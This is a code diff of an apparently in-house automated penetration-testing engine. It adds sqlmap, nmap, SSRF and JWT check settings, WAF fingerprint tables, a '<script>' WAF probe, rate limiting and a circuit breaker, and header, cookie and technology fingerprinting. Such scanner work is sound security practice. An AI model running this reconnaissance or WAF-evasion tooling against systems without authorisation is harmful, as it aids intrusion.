@@ -1,4 +1,4 @@
-"""
+﻿"""
 Falcon MAG - NIGHTFALL Core v2
 Single-file autonomous VAPT engine.
 Built from scratch using anthropic SDK (no ascii codec issues).
@@ -70,10 +70,84 @@ class ScanConfig:
     output_dir: str = "reports"
     db_path: str = str(Path(__file__).resolve().parent.parent.parent / "falcon.db")
 
+    # === Protection layers (Stage 2.C, additive) ===
+    cb_threshold: int = 3          # failures before circuit opens
+    cb_cooldown: float = 30.0      # initial cooldown seconds
+    cb_max_trip: float = 120.0     # max cooldown seconds
+    max_retries: int = 2           # retry attempts for 5xx/timeout
+    retry_backoff: float = 1.0     # base backoff (doubles each retry)
+
+    # === SQLMap bridge (Stage 2.B1, additive) ===
+    sqlmap_enabled: bool = True
+    sqlmap_timeout: int = 60
+    sqlmap_level: int = 2
+    sqlmap_risk: int = 1
+
+    # === Nmap integration (Stage 2.B1, additive) ===
+    nmap_enabled: bool = True
+    nmap_timeout: int = 45
+    nmap_top_ports: int = 100
+
+    # === SSRF advanced (Stage 2.B2, additive) ===
+    ssrf_cloud_metadata: bool = True
+    ssrf_local_services: bool = True
+
+    # === JWT multi-vector (Stage 2.B2, additive) ===
+    jwt_check_jku: bool = True
+    jwt_check_x5u: bool = True
+    jwt_check_kid: bool = True
+
 
 # ============================================================
 # Logger (safe for Windows + subprocess)
 # ============================================================
+
+class StructuredScanLogger:
+    """Structured logger that writes JSON lines for machine parsing."""
+
+    def __init__(self, name="scan", log_dir=None):
+        import os
+        self.name = name
+        if log_dir is None:
+            log_dir = os.path.join(os.getcwd(), "logs")
+        try:
+            os.makedirs(log_dir, exist_ok=True)
+        except Exception:
+            log_dir = "."
+        self.log_file = os.path.join(log_dir, f"scan_{name}.jsonl")
+
+    def _write(self, level, event, **kwargs):
+        import json as _json
+        import time as _time
+        entry = {
+            "timestamp": _time.time(),
+            "level": level,
+            "event": event,
+            "logger": self.name,
+        }
+        entry.update(kwargs)
+        try:
+            with open(self.log_file, "a", encoding="utf-8") as f:
+                f.write(_json.dumps(entry, ensure_ascii=False) + "\n")
+        except Exception:
+            pass
+        try:
+            log.info(event, **kwargs)
+        except Exception:
+            pass
+
+    def info(self, event, **kwargs):
+        self._write("info", event, **kwargs)
+
+    def warning(self, event, **kwargs):
+        self._write("warning", event, **kwargs)
+
+    def error(self, event, **kwargs):
+        self._write("error", event, **kwargs)
+
+    def debug(self, event, **kwargs):
+        self._write("debug", event, **kwargs)
+
 
 def setup_logger(name: str = "falcon", level: str = "INFO"):
     """Set up structlog with dual output: console + current_scan.log file."""
@@ -319,6 +393,276 @@ class RateLimiter:
             self._buckets[host] = (tokens, time.monotonic())
 
 
+
+# ============================================================
+# WAF SIGNATURES EXTENDED (Stage 2.B-D)
+# ============================================================
+# Additional signatures: +30 (total 60+). Includes body-based detection.
+
+WAF_SIGNATURES_EXTENDED = [
+    # (Name, header_keys, server_keys, cookie_prefixes)
+    ("Azure Front Door", ["x-azure-ref", "x-fd-healthprobe"], ["azurefd"], []),
+    ("Azure App Gateway", ["x-azure-ref"], ["microsoft-azure-application-gateway"], []),
+    ("Google Cloud LB", ["x-cloud-trace-context", "via: google"], ["gvs", "google"], []),
+    ("DigitalOcean LB", ["x-do-app-origin", "x-do-orig-status"], [], []),
+    ("Netlify", [], ["netlify"], []),
+    ("Heroku", [], ["heroku"], []),
+    ("GitHub Pages", [], ["github.com"], []),
+    ("Vercel", ["x-vercel-id", "x-vercel-cache"], ["vercel"], []),
+    ("Akamai Kona", ["x-akamai-edgescape"], ["akamai-ghost"], []),
+    ("Akamai Kona SiteDefender", [], ["akamai"], ["ak_bmsc", "bm_sv"]),
+    ("Signal Sciences", ["x-sigsci-requestid", "x-sigsci-tags"], [], ["_sigsci"]),
+    ("Rapid7 AppSpider", [], ["rapid7"], []),
+    ("Qualys WAF", [], ["qualysguard"], []),
+    ("Alert Logic", [], ["alertlogic"], []),
+    ("A10 Thunder", [], ["a10", "thunder"], []),
+    ("Airlock", [], ["airlock"], []),
+    ("Bekchy", [], ["bekchy"], []),
+    ("BinarySec", [], ["binarysec"], []),
+    ("BlockDoS", [], ["blockdos"], []),
+    ("ChinaCache", [], ["chinacache"], []),
+    ("Cisco ACE XML Gateway", [], ["ace xml gateway"], []),
+    ("Cisco ASA", [], ["cisco"], []),
+    ("Cloudbric", [], ["cloudbric"], []),
+    ("Comodo WAF", ["x-cwaf-id"], ["cwaf"], ["cwaf"]),
+    ("CrawlProtect", [], ["crawlprotect"], ["crawlprotect"]),
+    ("DBAPPSecurity", [], ["dbappsecurity"], ["dbap-session"]),
+    ("DotDefender", [], ["dotdefender"], ["dotdefender"]),
+    ("DoSArrest", [], ["dosarrest"], []),
+    ("Edgecast", [], ["edgecast"], []),
+    ("ExpressionEngine", [], ["expressionengine"], ["exp_csrf_token"]),
+    ("Google Web Toolkit", [], ["gwt"], []),
+    ("HyperGuard", [], ["hyperguard"], ["regist_id"]),
+    ("IBM DataPower", [], ["datapower"], []),
+    ("IIS Enterprise", [], ["iis"], []),
+    ("Imunify360", [], ["imunify360"], ["imunify360"]),
+    ("Incapsula", [], ["incapsula"], ["visid_incap"]),
+    ("Jiasule", [], ["jiasule"], ["jsluid", "jsl_clearance"]),
+    ("KS-WAF", [], ["ks-waf"], []),
+    ("Malcare", [], ["malcare"], []),
+    ("Mission Control", [], ["missioncontrol"], []),
+    ("NAXSI", [], ["naxsi"], []),
+    ("NetContinuum", [], ["netcontinuum"], ["nci_session"]),
+    ("Newdefend", [], ["newdefend"], []),
+    ("NSFOCUS", [], ["nsfocus"], []),
+    ("Oracle Cloud", [], ["oracle cloud"], []),
+    ("Oracle HTTP Server", [], ["oracle-http-server"], []),
+    ("Palo Alto", [], ["palo alto"], []),
+    ("Profense", [], ["profense"], ["plbsid"]),
+    ("Qiniu", [], ["qiniu"], []),
+    ("Rackspace", [], ["rackspace"], []),
+    ("Safedog Extended", [], ["safedog"], ["safedog-flow-item", "wzws_cid"]),
+    ("SiteLock", [], ["sitelock"], ["sitelock"]),
+    ("Stingray", [], ["stingray"], ["stingray"]),
+    ("Teros", [], ["teros"], ["st8id"]),
+    ("Trafficshield", [], ["trafficshield"], ["_t_"]),
+    ("URLMaster", [], ["urlmaster"], []),
+    ("USP Secure", [], ["usp secure"], []),
+    ("Varnish Extended", ["x-varnish"], ["varnish-cache"], []),
+    ("Wallarm Extended", ["x-wallarm-request-id"], ["wallarm-waf"], []),
+    ("WebKnight", [], ["webknight"], []),
+    ("Yundun", [], ["yundun"], ["yundun"]),
+    ("Zenedge", [], ["zenedge"], ["zenedge"]),
+]
+
+
+WAF_BODY_PATTERNS = [
+    ("Cloudflare", ["Attention Required! | Cloudflare", "ray ID", "cf-error-details", "cloudflare.com/5xx"]),
+    ("Sucuri", ["Sucuri WebSite Firewall", "Access Denied - Sucuri", "CloudProxy"]),
+    ("ModSecurity", ["ModSecurity", "This error was generated by Mod_Security", "mod_security"]),
+    ("Wordfence", ["Wordfence", "Generated by Wordfence", "waf_message"]),
+    ("AWS WAF", ["AWS WAF", "Request blocked", "Forbidden: AWS WAF"]),
+    ("Imperva", ["Incapsula", "Imperva", "Request unsuccessful"]),
+    ("F5 BIG-IP", ["The requested URL was rejected", "Please consult with your administrator", "Support ID"]),
+    ("Barracuda", ["Barracuda", "barra_counter"]),
+    ("Fortinet", ["FortiWeb", "The URL you requested has been blocked"]),
+    ("Akamai", ["Reference #18", "Reference #9", "Access Denied", "AkamaiGHost"]),
+    ("Alibaba Cloud", ["The request could not be satisfied", "Aliyun", "Blocked by Aliyun"]),
+    ("360 WAF", ["360wzws", "wangzhan.360.cn", "safedog"]),
+    ("SafeDog", ["SafeDog", "safedog.cn"]),
+    ("Yunsuo", ["Yunsuo", "yunsuo.com"]),
+    ("DDoS-GUARD", ["DDoS-Guard", "ddos-guard.net"]),
+    ("Google Cloud Armor", ["Cloud Armor", "The request was blocked by Google Cloud Armor"]),
+    ("Azure Front Door", ["Our services aren't available right now", "Azure Front Door"]),
+]
+
+
+def _waf_match_extended(headers_lower, cookies_str, body_lower):
+    """Match all WAF signatures (headers + cookies + body)."""
+    matches = []
+    server = headers_lower.get("server", "").lower()
+    via = headers_lower.get("via", "").lower()
+    for name, hk_list, sk_list, ck_list in WAF_SIGNATURES_EXTENDED:
+        signals = []
+        for hk in hk_list:
+            if hk in headers_lower:
+                signals.append("header:" + hk)
+        for sk in sk_list:
+            if sk in server or sk in via:
+                signals.append("server:" + sk)
+        for ck in ck_list:
+            if ck.lower() in cookies_str.lower():
+                signals.append("cookie:" + ck)
+        if signals:
+            matches.append({"name": name, "signals": signals, "source": "extended"})
+    # Body patterns
+    for name, patterns in WAF_BODY_PATTERNS:
+        for p in patterns:
+            if p.lower() in body_lower:
+                matches.append({"name": name, "signals": ["body:" + p[:40]], "source": "body"})
+                break
+    return matches
+
+
+async def test_waf_body_detection(pool, target):
+    """Detect WAF via error page body content."""
+    resp = await pool.send("GET", target.rstrip("/") + "/?waf_probe=<script>")
+    if not resp or resp.status == 0:
+        return {"detected": False, "waf": None}
+    body = (resp.text or "").lower()
+    matches = []
+    for name, patterns in WAF_BODY_PATTERNS:
+        for p in patterns:
+            if p.lower() in body:
+                matches.append({"name": name, "matched": p})
+                break
+    result = {
+        "detected": bool(matches),
+        "waf": matches[0]["name"] if matches else None,
+        "matches": matches,
+        "blocked_status": resp.status if resp.status in (403, 406, 419, 429, 503) else None,
+    }
+    log.info("waf_body_detection", detected=result["detected"], waf=result["waf"])
+    return result
+
+
+# END WAF SIGNATURES EXTENDED
+
+
+# === ADAPTIVE RATE + CIRCUIT BREAKER (v2) ===
+# Added: 2026-09-21 — Stage 2.C
+# Purpose: Prevent server DoS via adaptive throttling + circuit breaker + retry.
+# Backward compatible: RateLimiter stays unchanged; these are optional layers.
+
+class CircuitBreaker:
+    """Trips open when target shows signs of stress (429/503/timeout).
+
+    States:
+      closed   → normal traffic
+      half-open → slow traffic (testing recovery)
+      open     → blocked for a cooldown period
+    """
+
+    def __init__(self, threshold=3, cooldown_sec=30.0, max_trip_sec=120.0):
+        self.threshold = threshold          # failures before trip
+        self.cooldown_sec = cooldown_sec    # initial cooldown
+        self.max_trip_sec = max_trip_sec    # max cooldown
+        self._state = {}                    # host -> "closed" | "open" | "half-open"
+        self._failures = {}                 # host -> consecutive count
+        self._opened_at = {}                # host -> monotonic timestamp
+        self._trip_count = {}               # host -> how many times tripped
+
+    def record_success(self, host):
+        """Reset failure counter on success."""
+        if not host:
+            return
+        self._failures[host] = 0
+        if self._state.get(host) == "half-open":
+            self._state[host] = "closed"
+
+    def record_failure(self, host, kind="block"):
+        """kind = 'block' (429/503) or 'timeout'."""
+        if not host:
+            return
+        self._failures[host] = self._failures.get(host, 0) + 1
+        if self._failures[host] >= self.threshold:
+            self._state[host] = "open"
+            self._opened_at[host] = time.monotonic()
+            self._trip_count[host] = self._trip_count.get(host, 0) + 1
+
+    def is_open(self, host):
+        """Return True if we should skip requests to this host."""
+        if not host:
+            return False
+        if self._state.get(host) != "open":
+            return False
+        # Check cooldown
+        opened_at = self._opened_at.get(host, 0)
+        elapsed = time.monotonic() - opened_at
+        # Cooldown doubles on each trip, capped at max
+        trips = self._trip_count.get(host, 1)
+        cooldown = min(self.cooldown_sec * (2 ** (trips - 1)), self.max_trip_sec)
+        if elapsed >= cooldown:
+            self._state[host] = "half-open"
+            self._failures[host] = 0
+            return False
+        return True
+
+    def status(self, host):
+        """Return diagnostic dict for a host."""
+        return {
+            "host": host,
+            "state": self._state.get(host, "closed"),
+            "failures": self._failures.get(host, 0),
+            "trips": self._trip_count.get(host, 0),
+        }
+
+
+class AdaptiveRateLimiter(RateLimiter):
+    """RateLimiter with dynamic rate adjustment based on server responses.
+
+    Starts at `rate_per_sec`. Halves on 429/503. Slowly recovers on success.
+    """
+
+    def __init__(self, rate_per_sec=30.0, burst=5, min_rate=1.0):
+        super().__init__(rate_per_sec=rate_per_sec, burst=burst)
+        self.base_rate = rate_per_sec
+        self.min_rate = min_rate
+        self._current_rate = {}   # host -> current effective rate
+        self._success_streak = {} # host -> consecutive successful requests
+
+    def get_rate(self, host):
+        return self._current_rate.get(host, self.base_rate)
+
+    def on_block(self, host):
+        """Halve the rate for this host (min = min_rate)."""
+        if not host:
+            return
+        current = self._current_rate.get(host, self.base_rate)
+        new_rate = max(current / 2.0, self.min_rate)
+        self._current_rate[host] = new_rate
+        self._success_streak[host] = 0
+
+    def on_success(self, host):
+        """Recover rate gradually after N consecutive successes."""
+        if not host:
+            return
+        self._success_streak[host] = self._success_streak.get(host, 0) + 1
+        # Every 10 successes, increase rate by 25% (up to base)
+        if self._success_streak[host] >= 10:
+            current = self._current_rate.get(host, self.base_rate)
+            if current < self.base_rate:
+                new_rate = min(current * 1.25, self.base_rate)
+                self._current_rate[host] = new_rate
+            self._success_streak[host] = 0
+
+    async def acquire(self, host):
+        """Uses dynamic rate for this host."""
+        # Use dynamic rate in token refill
+        if host in self._current_rate:
+            old_rate = self.rate
+            self.rate = self._current_rate[host]
+            try:
+                await super().acquire(host)
+            finally:
+                self.rate = old_rate
+        else:
+            await super().acquire(host)
+
+
+# === END ADAPTIVE RATE + CIRCUIT BREAKER (v2) ===
+
+
 @dataclass
 class HttpResponse:
     url: str
@@ -336,6 +680,23 @@ class HttpPool:
         self.config = config
         self.client = None
         self.request_count = 0
+
+        # === Protection layers (additive, backward compatible) ===
+        self.circuit_breaker = CircuitBreaker(
+            threshold=getattr(config, "cb_threshold", 3),
+            cooldown_sec=getattr(config, "cb_cooldown", 30.0),
+            max_trip_sec=getattr(config, "cb_max_trip", 120.0),
+        )
+        self.adaptive = (
+            self.rate if isinstance(self.rate, AdaptiveRateLimiter) else None
+        )
+        self.max_retries = getattr(config, "max_retries", 2)
+        self.retry_backoff = getattr(config, "retry_backoff", 1.0)
+        # Track retriable status codes
+        self.retriable_status = {500, 502, 503, 504}
+        # Track last error kind per host
+        self._blocked_hosts = set()
+        self._retry_count = 0  # stats
     async def __aenter__(self):
         self.client = httpx.AsyncClient(timeout=5.0, follow_redirects=True, verify=False, headers={"User-Agent": self.config.user_agent})
         return self
@@ -343,22 +704,778 @@ class HttpPool:
         if self.client:
             await self.client.aclose()
     async def send(self, method, url, **kwargs):
+        # ── 1. Scope & budget checks (as before) ─────────────
         if not self.scope.is_allowed(url):
             return HttpResponse(url=url, status=0, headers={}, text="", elapsed_ms=0.0, error="out of scope")
         if self.request_count >= self.config.budget:
             return HttpResponse(url=url, status=0, headers={}, text="", elapsed_ms=0.0, error="budget exhausted")
-        parsed = urlparse(url)
-        await self.rate.acquire(parsed.hostname or "")
-        start = time.monotonic()
-        self.request_count += 1
-        try:
-            resp = await self.client.request(method, url, **kwargs)
-            elapsed = (time.monotonic() - start) * 1000
-            return HttpResponse(url=str(resp.url), status=resp.status_code, headers=dict(resp.headers), text=resp.text[:200000], elapsed_ms=round(elapsed, 2))
-        except Exception as exc:
-            elapsed = (time.monotonic() - start) * 1000
-            return HttpResponse(url=url, status=0, headers={}, text="", elapsed_ms=round(elapsed, 2), error=str(exc))
 
+        parsed = urlparse(url)
+        host = parsed.hostname or ""
+
+        # ── 2. Circuit breaker (NEW — additive) ──────────────
+        if self.circuit_breaker.is_open(host):
+            return HttpResponse(
+                url=url, status=0, headers={}, text="", elapsed_ms=0.0,
+                error=f"circuit_open (host={host})"
+            )
+
+        # ── 3. Rate limit (as before) ────────────────────────
+        await self.rate.acquire(host)
+
+        # ── 4. Retry loop for transient errors (NEW) ─────────
+        last_resp = None
+        attempt = 0
+        while attempt <= self.max_retries:
+            start = time.monotonic()
+            self.request_count += 1
+            if attempt > 0:
+                self._retry_count += 1
+
+            try:
+                resp = await self.client.request(method, url, **kwargs)
+                elapsed = (time.monotonic() - start) * 1000
+                status = resp.status_code
+
+                # Retriable status → schedule retry
+                if status in self.retriable_status and attempt < self.max_retries:
+                    # record block on the adaptive limiter
+                    if self.adaptive and status in (429, 503):
+                        self.adaptive.on_block(host)
+                    # wait before retry
+                    await asyncio.sleep(self.retry_backoff * (2 ** attempt))
+                    attempt += 1
+                    last_resp = resp
+                    continue
+
+                # 429/503 → record block
+                if status in (429, 503):
+                    self.circuit_breaker.record_failure(host, kind="block")
+                    if self.adaptive:
+                        self.adaptive.on_block(host)
+                else:
+                    # Success → record success
+                    self.circuit_breaker.record_success(host)
+                    if self.adaptive:
+                        self.adaptive.on_success(host)
+
+                return HttpResponse(
+                    url=str(resp.url), status=status,
+                    headers=dict(resp.headers),
+                    text=resp.text[:200000],
+                    elapsed_ms=round(elapsed, 2),
+                )
+
+            except Exception as exc:
+                elapsed = (time.monotonic() - start) * 1000
+                is_timeout = "timeout" in str(exc).lower()
+                if is_timeout:
+                    self.circuit_breaker.record_failure(host, kind="timeout")
+
+                if attempt < self.max_retries and is_timeout:
+                    await asyncio.sleep(self.retry_backoff * (2 ** attempt))
+                    attempt += 1
+                    continue
+
+                return HttpResponse(
+                    url=url, status=0, headers={}, text="",
+                    elapsed_ms=round(elapsed, 2), error=str(exc)
+                )
+
+        # All retries exhausted
+        if last_resp is not None:
+            return HttpResponse(
+                url=str(last_resp.url), status=last_resp.status_code,
+                headers=dict(last_resp.headers),
+                text=last_resp.text[:200000], elapsed_ms=0.0,
+                error="retries exhausted"
+            )
+        return HttpResponse(
+            url=url, status=0, headers={}, text="", elapsed_ms=0.0,
+            error="retries exhausted"
+        )
+
+    def protection_status(self):
+        """Return diagnostic dict of protection layers."""
+        return {
+            "circuit_breaker": {
+                "hosts_tracked": len(self.circuit_breaker._state),
+                "hosts_open": sum(
+                    1 for h in self.circuit_breaker._state
+                    if self.circuit_breaker._state[h] == "open"
+                ),
+            },
+            "adaptive": {
+                "enabled": self.adaptive is not None,
+                "hosts_throttled": len(self.adaptive._current_rate) if self.adaptive else 0,
+            },
+            "retries": {
+                "total_retries": self._retry_count,
+                "max_retries": self.max_retries,
+            },
+        }
+
+
+async def test_fingerprint_advanced(pool, target):
+    """Advanced fingerprinting: Server, Language, Framework, CMS,
+    DB hints, JS libraries, security headers, cookies, WAF, meta tags."""
+    import re as _re
+    result = {
+        "target": target, "server": "", "powered_by": "",
+        "language": "", "framework": "", "cms": "",
+        "js_libs": [], "db_hints": [], "security_headers": {},
+        "missing_headers": [], "cookies": [], "waf": None,
+        "meta_tags": {}, "technologies": [], "all_technologies": [],
+    }
+    resp = await pool.send("GET", target)
+    if not resp or resp.status == 0:
+        result["error"] = "unreachable"
+        return result
+    headers_lower = {k.lower(): (v or "") for k, v in (resp.headers or {}).items()}
+    body = (resp.text or "")
+    body_lower = body.lower()
+
+    # Server
+    server_hdr = headers_lower.get("server", "")
+    result["server"] = server_hdr
+    sl = server_hdr.lower()
+    if "apache" in sl: result["technologies"].append("Apache")
+    if "nginx" in sl: result["technologies"].append("Nginx")
+    if "iis" in sl: result["technologies"].append("IIS")
+    if "litespeed" in sl: result["technologies"].append("LiteSpeed")
+    if "caddy" in sl: result["technologies"].append("Caddy")
+    if "gunicorn" in sl: result["technologies"].append("Gunicorn")
+    if "uvicorn" in sl: result["technologies"].append("Uvicorn")
+
+    # Powered-By
+    pb = headers_lower.get("x-powered-by", "")
+    result["powered_by"] = pb
+    pbl = pb.lower()
+    if "php" in pbl: result["language"] = "PHP"
+    if "asp.net" in pbl: result["language"] = "ASP.NET"
+    if "express" in pbl: result["framework"] = "Express"
+
+    # WAF
+    waf_hdrs = {
+        "cf-ray": "Cloudflare",
+        "x-akamai-transformed": "Akamai",
+        "x-amz-cf-id": "AWS CloudFront",
+        "x-sucuri-id": "Sucuri",
+        "x-iinfo": "Imperva",
+        "x-wa-info": "F5 BIG-IP",
+    }
+    for h, waf in waf_hdrs.items():
+        if h in headers_lower:
+            result["waf"] = waf
+            result["technologies"].append(waf)
+            break
+
+    # CMS detection
+    cms_patterns = {
+        "WordPress": ["/wp-content/", "/wp-includes/", "wp-json"],
+        "Joomla": ["/components/com_", "joomla"],
+        "Drupal": ["drupalsettings", "/sites/default/files/", "drupal"],
+        "Magento": ["mage/cookies", "/static/version", "magento"],
+        "Shopify": ["cdn.shopify.com", "shopify"],
+        "Wix": ["static.wixstatic.com", "wix.com"],
+        "Squarespace": ["static1.squarespace.com", "squarespace"],
+        "Ghost": ["ghost.org", "ghost-"],
+    }
+    for cms, patterns in cms_patterns.items():
+        if any(p in body_lower for p in patterns):
+            result["cms"] = cms
+            result["technologies"].append(cms)
+            break
+
+    # Framework
+    fw_patterns = {
+        "Next.js": ["/_next/", "__next_data__"],
+        "Nuxt": ["/_nuxt/", "__nuxt"],
+        "React": ["react-dom", "_reactroot"],
+        "Vue": ["vue.js", "vue.min.js", "data-v-"],
+        "Angular": ["ng-version", "angular"],
+        "Svelte": ["svelte-"],
+        "Django": ["csrfmiddlewaretoken", "__admin_media_prefix__"],
+        "Laravel": ["laravel_session", "xsrf-token"],
+        "Rails": ["csrf-param", "rails-"],
+        "Spring": ["jsessionid", "whitelabel error"],
+    }
+    for fw, patterns in fw_patterns.items():
+        if any(p in body_lower for p in patterns):
+            if not result["framework"]:
+                result["framework"] = fw
+            result["technologies"].append(fw)
+            break
+
+    # Language inference
+    if not result["language"]:
+        if "php" in body_lower or "phpsessid" in str(headers_lower):
+            result["language"] = "PHP"
+        elif "jsessionid" in str(headers_lower):
+            result["language"] = "Java"
+        elif "werkzeug" in sl or "python" in str(headers_lower):
+            result["language"] = "Python"
+        elif "asp.net" in str(headers_lower):
+            result["language"] = "ASP.NET"
+        elif "express" in str(headers_lower) or "node" in str(headers_lower):
+            result["language"] = "Node.js"
+    if result["language"]:
+        result["technologies"].append(result["language"])
+
+    # JS libraries
+    js_libs_patterns = {
+        "jQuery": ["jquery"],
+        "React": ["react."],
+        "Vue.js": ["vue."],
+        "Angular": ["angular."],
+        "Bootstrap": ["bootstrap."],
+        "Tailwind": ["tailwind"],
+        "Alpine.js": ["alpine"],
+        "HTMX": ["htmx"],
+        "Lodash": ["lodash"],
+        "Moment.js": ["moment."],
+    }
+    for lib, patterns in js_libs_patterns.items():
+        if any(p in body_lower for p in patterns):
+            result["js_libs"].append(lib)
+            result["technologies"].append(lib)
+
+    # DB hints
+    db_patterns = {
+        "MySQL": ["mysql", "mysqli"],
+        "PostgreSQL": ["postgresql", "pg_query", "sqlstate"],
+        "MSSQL": ["microsoft sql server", "odbc sql server", "sqlserver"],
+        "Oracle": ["oracle"],
+        "MongoDB": ["mongodb", "mongo error", "bson"],
+        "SQLite": ["sqlite"],
+        "Redis": ["redis"],
+    }
+    for db, patterns in db_patterns.items():
+        if any(p in body_lower for p in patterns):
+            result["db_hints"].append(db)
+
+    # Security headers
+    security_headers = [
+        "content-security-policy",
+        "strict-transport-security",
+        "x-frame-options",
+        "x-content-type-options",
+        "referrer-policy",
+        "permissions-policy",
+        "x-xss-protection",
+    ]
+    for h in security_headers:
+        if h in headers_lower:
+            result["security_headers"][h] = headers_lower[h][:200]
+        else:
+            result["missing_headers"].append(h)
+
+    # Cookies
+    raw_cookies = headers_lower.get("set-cookie", "")
+    if raw_cookies:
+        for chunk in _re.split(r",\s*(?=[A-Za-z0-9_\-]+=)", raw_cookies):
+            name = chunk.split("=", 1)[0].strip() if "=" in chunk else ""
+            if name:
+                result["cookies"].append({
+                    "name": name,
+                    "secure": "secure" in chunk.lower(),
+                    "httponly": "httponly" in chunk.lower(),
+                    "samesite": ("samesite=" in chunk.lower()),
+                })
+
+    # Meta tags (safe regex)
+    meta_re = _re.compile(r'<meta\s+[^>]*?name\s*=\s*["\x27]([^"\x27]+)["\x27][^>]*?content\s*=\s*["\x27]([^"\x27]*)["\x27]', _re.IGNORECASE)
+    for match in meta_re.finditer(body):
+        k = match.group(1).lower()
+        v = match.group(2)[:200]
+        if len(result["meta_tags"]) < 20:
+            result["meta_tags"][k] = v
+
+    # Dedupe technologies
+    seen = set()
+    unique_tech = []
+    for t in result["technologies"]:
+        if t and t not in seen:
+            seen.add(t)
+            unique_tech.append(t)
+    result["technologies"] = unique_tech
+    result["all_technologies"] = unique_tech
+
+    log.info("fingerprint_advanced_complete",
+             server=result["server"][:40],
+             tech_count=len(unique_tech),
+             waf=result["waf"])
+    return result
+
+
+async def test_security_headers(pool, target):
+    """Detailed security headers analysis."""
+    resp = await pool.send("GET", target)
+    if not resp or resp.status == 0:
+        return {"error": "unreachable", "target": target}
+    hdrs = {k.lower(): (v or "") for k, v in (resp.headers or {}).items()}
+    SECURITY_HEADERS = {
+        "content-security-policy": "high",
+        "strict-transport-security": "high",
+        "x-frame-options": "medium",
+        "x-content-type-options": "medium",
+        "referrer-policy": "low",
+        "permissions-policy": "low",
+        "x-xss-protection": "low",
+        "cross-origin-opener-policy": "low",
+        "cross-origin-embedder-policy": "low",
+        "cross-origin-resource-policy": "low",
+    }
+    present = {}
+    missing = []
+    for h, sev in SECURITY_HEADERS.items():
+        if h in hdrs:
+            present[h] = hdrs[h][:300]
+        else:
+            missing.append({"header": h, "severity": sev})
+    findings = []
+    for item in missing:
+        findings.append({
+            "vuln_class": "security_headers",
+            "subtype": "missing_header",
+            "severity": item["severity"],
+            "url": target,
+            "param": item["header"],
+            "payload": "",
+            "evidence": f"Missing: {item['header']}",
+            "confidence": 0.9,
+        })
+    log.info("security_headers_complete",
+             present=len(present), missing=len(missing))
+    return {
+        "target": target,
+        "present": present,
+        "missing": missing,
+        "findings": findings,
+        "vulnerable": findings,
+    }
+
+
+async def test_cookies_advanced(pool, target):
+    """Detailed cookie security analysis."""
+    import re as _re
+    resp = await pool.send("GET", target)
+    if not resp or resp.status == 0:
+        return {"error": "unreachable", "target": target}
+    hdrs = {k.lower(): (v or "") for k, v in (resp.headers or {}).items()}
+    raw = hdrs.get("set-cookie", "")
+    cookies = []
+    findings = []
+    if not raw:
+        return {"target": target, "cookies": [], "vulnerable": []}
+    SESSION_HINTS = ("session", "sess", "sid", "auth", "token", "jwt",
+                     "login", "user", "csrf", "remember")
+    for chunk in _re.split(r",\s*(?=[A-Za-z0-9_\-]+=)", raw):
+        if "=" not in chunk:
+            continue
+        name = chunk.split("=", 1)[0].strip()
+        if not name:
+            continue
+        lower = chunk.lower()
+        info = {
+            "name": name,
+            "secure": "secure" in lower,
+            "httponly": "httponly" in lower,
+            "samesite": None,
+        }
+        m = _re.search(r"samesite=(\w+)", lower)
+        if m:
+            info["samesite"] = m.group(1)
+        cookies.append(info)
+        missing = []
+        if not info["secure"]:
+            missing.append("Secure")
+        if not info["httponly"]:
+            missing.append("HttpOnly")
+        if not info["samesite"]:
+            missing.append("SameSite")
+        if not missing:
+            continue
+        name_lower = name.lower()
+        is_session = any(h in name_lower for h in SESSION_HINTS)
+        sev = "medium" if is_session else "low"
+        if "Secure" in missing and "HttpOnly" in missing and is_session:
+            sev = "high"
+        findings.append({
+            "vuln_class": "cookies",
+            "subtype": "insecure_cookie",
+            "severity": sev,
+            "url": target,
+            "param": name,
+            "payload": "",
+            "evidence": f"Cookie '{name}' missing: {', '.join(missing)}",
+            "confidence": 0.9,
+        })
+    log.info("cookies_advanced_complete", total=len(cookies), insecure=len(findings))
+    return {
+        "target": target,
+        "cookies": cookies,
+        "findings": findings,
+        "vulnerable": findings,
+    }
+
+
+# ============================================================
+# WAF ADVANCED DETECTION (Stage 2.B8-WAF)
+# ============================================================
+# 30+ WAF signatures, active probing, strictness analysis,
+# bypass suggestions. Coexists with legacy detect_waf().
+
+WAF_SIGNATURES = [
+    # (Name, header_keys_lower, server_keywords_lower, cookie_prefixes)
+    ("Cloudflare", ["cf-ray", "cf-cache-status", "cf-request-id"], ["cloudflare"], ["__cf_bm", "__cfduid", "cf_clearance"]),
+    ("AWS WAF", ["x-amzn-requestid", "x-amz-cf-id", "x-amz-apigw-id"], ["awselb", "aws-waf"], []),
+    ("AWS CloudFront", ["x-amz-cf-pop", "x-amz-cf-id"], ["cloudfront"], []),
+    ("Akamai", ["x-akamai-transformed", "akamai-grn", "x-akamai-request-id"], ["akamaighost", "akamai"], []),
+    ("Sucuri", ["x-sucuri-id", "x-sucuri-cache", "x-sucuri-block"], ["sucuri"], ["sucuri_cloudproxy"]),
+    ("Imperva", ["x-iinfo", "x-cdn"], ["incapsula", "imperva"], ["incap_ses", "visid_incap"]),
+    ("F5 BIG-IP", ["x-wa-info", "x-cnection"], ["bigipserver", "f5", "big-ip"], ["bigipserver", "ts", "f5_cspm"]),
+    ("Barracuda", ["barra_counter_session"], ["barracuda"], ["barra_counter_session", "barra_session"]),
+    ("ModSecurity", [], ["mod_security", "modsecurity", "noModSecurity"], []),
+    ("Wordfence", ["x-wordfence"], ["wordfence"], ["wfvt_", "wordfence_verifiedHuman"]),
+    ("Fortinet", [], ["fortiweb", "fortigate"], ["FORTIWAFSID"]),
+    ("Citrix NetScaler", ["x-ns-cache"], ["netscaler", "citrix", "ns-cache"], ["citrix_ns_id", "NSC_"]),
+    ("Fastly", ["x-served-by", "x-fastly-request-id", "fastly-debug-digest"], ["fastly", "varnish"], []),
+    ("Varnish", ["x-varnish", "via"], ["varnish"], []),
+    ("StackPath", ["x-sp-cache"], ["stackpath"], []),
+    ("KeyCDN", ["x-cache"], ["keycdn"], []),
+    ("Radware", [], ["radware", "appwall"], ["rdwr"]),
+    ("Wallarm", ["x-wallarm-waf", "server: nginx-wallarm"], ["wallarm"], []),
+    ("DenyAll", [], ["denyall"], ["sessioncookie"]),
+    ("Reblaze", ["rbzid"], ["reblaze"], []),
+    ("Distil", [], ["distil"], []),
+    ("Juniper", [], ["juniper", "junos"], []),
+    ("NGINX Plus", [], ["nginx-plus"], []),
+    ("Cloudflare Bot Mgmt", ["cf-mitigated"], [], ["cf_chl_"]),
